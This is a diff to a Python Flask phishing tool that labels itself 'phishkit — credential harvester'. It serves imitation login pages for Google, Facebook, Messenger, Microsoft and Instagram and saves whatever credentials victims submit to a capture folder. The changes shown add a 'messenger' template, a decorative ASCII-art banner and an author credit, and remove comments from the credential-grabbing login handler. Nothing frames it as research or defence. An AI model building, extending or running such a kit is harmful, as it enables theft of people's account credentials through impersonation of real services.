@@ -17,6 +17,45 @@ import config
 
 init(autoreset=True)
 
+BANNER_ART = r"""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡤⢤⣀⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⠞⢩⣧⡨⠿⠿⢿⡝⠯⠛⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⡀⢀⣶⠟⠍⠁⢒⠿⡠⠖⠉⠉⢙⣷⠀⠀⢀⡈⠩⣲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢦⡿⣥⡖⣲⣿⣿⣞⣁⣀⠔⠘⠻⠙⠷⡈⡆⠘⢷⡌⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢰⡿⣟⣶⣿⣿⣿⠋⣹⠟⠁⠰⣌⠀⠀⡀⠀⠈⠀⠀⣻⠀⣌⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⡇⡸⣾⣿⣿⡇⣸⡏⣵⣟⣞⣿⣇⢡⠀⢺⢪⠷⢪⡵⡯⢜⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠐⡿⢰⢁⣟⠀⠉⠰⠑⣨⡶⣶⠷⣦⠻⡸⣥⢳⡚⠀⠨⢍⢛⣡⢾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣷⢸⢸⢷⡰⢤⠾⠐⣁⠀⢇⠸⢹⠁⣟⣷⣼⢔⢐⠐⣮⡨⣜⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢿⣿⡠⣼⡝⢦⠣⠁⠀⠉⠙⠘⠈⠀⠈⠈⣿⡚⠄⠂⡉⢨⣿⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠈⢧⠙⣤⢇⠘⣧⡀⠀⠀⠀⠀⠀⠀⠂⠑⢽⡄⢂⢠⣵⢷⠃⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠸⠺⣞⠝⣇⣿⠙⢦⡀⠀⠈⠙⠶⠖⠂⣿⡀⢔⡭⢣⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
+⠀⠀⢀⡤⠶⠶⠿⢿⣿⡇⠀⠀⠈⠓⠤⣤⡤⠖⠘⠩⠊⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⡴⠋⠀⠀⠀⠀⠀⠙⢓⠤⠄⣀⡀⠀⢸⣷⣶⡯⠤⠚⠒⠒⠢⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⠃⠀⠀⠀⠀⠀⢀⢇⡀⠝⡆⡒⠒⠒⠻⠧⣄⠀⠀⢀⠢⠤⠤⢄⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⡚⠀⠀⠀⠀⠀⠀⡸⠋⠀⠁⣿⡀⠀⠀⠀⠀⢧⡀⠁⠄⠀⠀⠀⠀⠙⢿⡉⠐⡀⠂⠀⠀⠀⠀⠠⠂⠀⠀
+⢹⠀⠀⠀⠀⠀⢠⠇⠀⣴⢛⡡⢗⣭⣓⣦⡀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⡽⢧⣬⠠⠀⠀⠀⠀⠁⠀⠀⠀
+⠀⣇⠀⠀⠀⠀⢸⡀⣼⡽⢋⡜⠂⠨⠽⣿⣷⡷⡤⡈⢻⠀⠀⠀⠀⠀⡜⣁⣾⢯⠳⣴⠀⠀⠀⠀⠠⠁⠀
+⠀⠻⡄⠀⠀⠀⠀⢏⢛⣾⣷⠻⠡⢃⠎⡋⡋⢻⣋⣙⣿⣅⣀⣀⡴⢪⡎⡷⣁⠞⡢⣹⠀⢀⠀⠀⠄⠀⠀
+⠀⠀⣷⠀⠀⠀⠀⠈⡦⣳⢿⢿⠫⠆⡮⢻⣫⣔⣫⡿⠟⣀⡠⣄⢹⡽⣢⢟⠝⠈⢴⣿⠀⡀⠀⠀⠂⠀⠀
+⠀⠀⠹⡄⠀⠀⠀⠀⢸⠙⢻⢾⣒⡭⣕⠭⢿⡵⠞⠉⠁⠀⠀⠈⠳⣷⣍⡉⣗⣿⢿⠏⠀⠀⠀⠀⠄⠀⠀
+⠀⠀⡀⢥⠀⠀⠀⠀⢸⣏⣉⣚⣁⣀⠕⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡿⡛⠛⠊⠁⠀⠀⠀⠀⠀⠄⠀⠀
+⠀⠀⠀⢸⡄⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠄⠈⠀
+⠀⠈⠀⠈⣷⠀⠀⠀⠀⡹⣿⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠛⢧⡈⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⠄⠀⠀⠀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠱⣄⠀⠀⠠⢀⠀⠀⠐⠀⠀
+⠀⠀⠀⠀⠭⠄⠀⠀⡰⠏⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⢻⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠸⡆⠀⢰⠁⠀⠀⠈⠥⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⡄⠀⠋⣷⣄⠀⠀⠨⠀⠄
+⠀⠀⠀⠀⠀⢻⣄⣮⠀⠀⠀⠀⠈⠪⢑⠁⠀⡀⠀⠀⠀⡀⡀⠀⠀⠀⣀⣀⠄⠂⠀⢠⡿⠊⠻⣤⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⣿⠃⠀⠀⠀⠀⠀⠀⠀⠑⢦⣀⢥⡅⠒⠚⠛⠉⠁⠉⠋⠓⠀⣀⠴⡏⠇⠀⠀⠨⠳⡀⠀
+⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢜⢿⣿⣿⠟⢫⣙⣛⡿⢟⡻⢿⢭⣉⢽⠑⠀⠀⠀⠀⠀⠰⠀
+⠀⠀⠀⠀⢰⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠹⣷⣾⣾⣿⢾⣚⣯⣞⢦⢂⡮⡸⠈⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣺⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣶⣾⣟⣩⢶⡪⣂⢊⠁⠀⠀⠀⠀⠀⠀⠀⢃
+⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠸⢻⣯⣷⡫⢡⠶⠡⠀⠀⠀⠀⠀⠀⠀⠀⢸
+⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⠖⣱⡏⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
+⠀⠀⠀⠀⣺⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠽⣧⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠸⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠙⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+
 app = Flask(__name__, template_folder="templates", static_folder="static")
 
 CAPTURE_DIR = "captured"
@@ -74,12 +113,10 @@ def index():
 
 @app.route("/login", methods=["POST"])
 def login():
-    # Grab everything the form sends, plus common field names
     data = {}
     for k, v in request.form.items():
         data[k] = v
 
-    # Fallbacks for common field names
     if not data:
         data = request.get_json(silent=True) or {}
 
@@ -98,7 +135,7 @@ def main():
 
     parser = argparse.ArgumentParser(description="phishkit — credential harvester")
     parser.add_argument("-t", "--template", default="google",
-                        choices=["google", "microsoft", "instagram", "facebook", "generic"],
+                        choices=["google", "facebook", "messenger", "microsoft", "instagram", "generic"],
                         help="Login page template to serve")
     parser.add_argument("-p", "--port", type=int, default=config.PORT,
                         help="Port to listen on")
@@ -108,6 +145,7 @@ def main():
 
     CURRENT_TEMPLATE = args.template
 
+    print(BANNER_ART)
     banner = f"""
 {Fore.CYAN}phishkit{Style.RESET_ALL} — credential harvester
 Template : {Fore.YELLOW}{args.template}{Style.RESET_ALL}
@@ -115,6 +153,7 @@ Bind     : {args.host}:{args.port}
 Capture  : {Fore.GREEN}{config.CAPTURE_MODE}{Style.RESET_ALL}
 Redirect : {config.REDIRECT_URL}
 Captures : ./captured/
+{Fore.MAGENTA}made by ←→ Ace{Style.RESET_ALL}
 """
     print(banner)
     print(f"{Fore.GREEN}[*] Server running. Ctrl+C to stop.{Style.RESET_ALL}\n")
